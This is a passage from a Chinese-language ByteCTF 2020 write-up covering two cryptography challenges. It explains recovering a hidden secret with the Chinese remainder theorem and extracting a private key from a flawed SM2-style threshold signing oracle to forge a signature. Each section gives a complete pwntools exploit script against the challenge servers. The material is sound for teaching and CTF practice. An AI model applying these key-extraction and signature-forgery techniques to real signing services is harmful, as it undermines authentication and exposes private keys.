s = num \cdot r \pmod{secret}
$$

bless选项，让我们猜secret，猜中了就给flag。

思路：发送一个num（大概32-bit左右），使得$num \cdot r$刚好超过secret一点点，即

$$
s = num \cdot r - secret \tag{1}
$$

再在这个式子两边$\bmod r$，这样可以把未知的$num$删去，得到

$$
secret \equiv -s \pmod{r}
$$

那么显然如果$r$是一个32-bit左右的素数，且有32、33组这样的关系，就可以通过CRT得到secret。

不过由于随机数的分布是uniform的，并不是总能满足$(1)$，需要尝试好几次才能在64次机会中得到33组满足条件的数据。

exp.py如下：
```python
from pwn import *
from hashlib import sha256
from random import Random
from Crypto.Util.number import *
from functools import reduce
import time
import string


def chinese_remainder(a, n):
    sum = 0
    prod = reduce(lambda a, b: a*b, n)
    for n_i, a_i in zip(n, a):
        p = prod // n_i
        sum += a_i * inverse(p, n_i) * p
    return sum % prod



# def nextPrime(n):
#     while True:
#         n += 2
#         if isPrime(n):
#             return n

# primes = []
# p = 2**32 + 1
# for i in range(33):
#     p = nextPrime(p)
#     primes.append(p)
primes = [4294967311, 4294967357, 4294967371, 4294967377, 4294967387, 4294967389, 4294967459, 4294967477, 4294967497, 4294967513, 4294967539, 4294967543, 4294967549, 4294967561, 4294967563, 4294967569, 4294967597, 4294967627, 4294967639, 4294967653, 4294967681, 4294967687, 4294967701, 4294967723, 4294967759, 4294967779, 4294967783, 4294967791, 4294967797, 4294967821, 4294967857, 4294967861, 4294967867]


DEBUG = False
while True:
    try:
        if DEBUG:
            r = remote("127.0.0.1", 30101)
        else:
            r = remote("182.92.215.134", 30101)
            # proof of work
            rec = r.recvline().decode().strip()
            prefix = rec.split('"')[1]
            alphabet = string.ascii_letters + string.digits
            nonce = 0
            while True:
                if sha256((prefix + str(nonce)).encode()).hexdigest().startswith("00000"):
                    print(nonce)
                    break
                nonce += 1

            r.sendline(str(nonce).encode())


        r.recvline()
        xs = []
        ps = []
        for i in range(33):
            for j in range(100):
                r.sendline(b"god")           # op
                r.sendline(str(primes[i]).encode())    # num
                # time.sleep(0.05)
                output992 = int(r.recvline())

                if -output992 % primes[i] != 0:
                    xs.append((-output992) % primes[i])
                    ps.append(primes[i])
                    print(i, j, xs[i])
                    break


        secret = chinese_remainder(xs, ps)
        print(secret)

        time.sleep(0.1)
        r.sendline(b"bless")
        r.sendline(str(secret).encode())
        rec = r.recvline()
        print(rec)
        if b"WRONG" in rec:
            raise ValueError("WRONG")

        r.interactive()

    except Exception as e:
        print(e)
        r.close()
```

多开几个进程，跑就完事。

最后可以得到flag：ByteCTF{Noise_i5_rea11y_ANN0YING}


### threshold
审一下代码，得到如下信息：

$$
pks = ((sk + 1) \cdot sks ) ^ {-1} \pmod {n} \\
$$

sign会让我们输入3个数`r, s2, s3`，然后计算并返回

$$
s = sks \cdot k_1 \cdot s_2 + sks \cdot s_3 - r
$$

我们可以直接让`s2 = 0, s3 = 1, r = 0`，就能得到`sks`，进而解出`sk`

$$
sk = (pks \cdot sks)^{-1} \pmod{n}
$$

verify也会让我们输入3个数`r, s, e`，其中`r, s`是对`e`的签名，如果`e`是`Hello, Welcome to ByteCTF2020!`，就给flag。

验证签名的具体逻辑为：
1. 先计算$P = [s + (r+s)sk] G$；
2. 然后判断 $r \equiv e + P_x \pmod{n}$。

现在有了`sk`，那么构造合法的对e的签名就很简单了：

1. 选取一个数`k `，然后令$P = kG$，那么$k = (sk+1)\cdot s + r\cdot sk \pmod{n}$
2. 然后先从$r \equiv e + P_x \pmod{n}$中计算出`r`，再代入得到`s`。

> 为了方便，直接在脚本里选取k=2了。

exp.py如下


```python
from pwn import *
from Crypto.Util.number import *
from gmssl import func, sm2

import server


r = remote("182.92.153.117", 30103)
# context.log_level = 'debug'

pk = int(r.recvline().split(b":")[1].decode(), 16)
pks = int(r.recvline().split(b":")[1].decode(), 16)
log.info(f"pk: {pk}")
log.info(f"pks: {pks}")


backdoor = b'0'*128 + b'1'
r.sendlineafter(b"op: ", b"sign")
r.sendlineafter(b"backdoor:", backdoor)
sks = int(r.recvline(), 16)

n = 115792089210356248756420345214020892766061623724957744567843809356293439045923
# pks = (sk + 1) * sks ^ -1
sk = inverse(pks * sks, n) - 1
log.info(f"sk: {sk}")


data = b'Hello, Welcome to ByteCTF2020!'
e = int(data.hex(), 16)

k = 2
tsm2 = server.TSM2('0xdeadbeaf')
P1_P2 = tsm2._kg(k, server.G)
R = int(P1_P2[:64], 16) + e

s = inverse(1+sk, n) * (k - R*sk) % n

r.sendlineafter(b"op: ", b"verify")
r.sendlineafter(b"msg:", data)
r.sendlineafter(b"sign:", hex(R)[2:].zfill(64) + hex(s)[2:].zfill(64))


r.interactive()
```

![image-20201026005123908](https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/2sNMv6FzAjpWtmQ.png)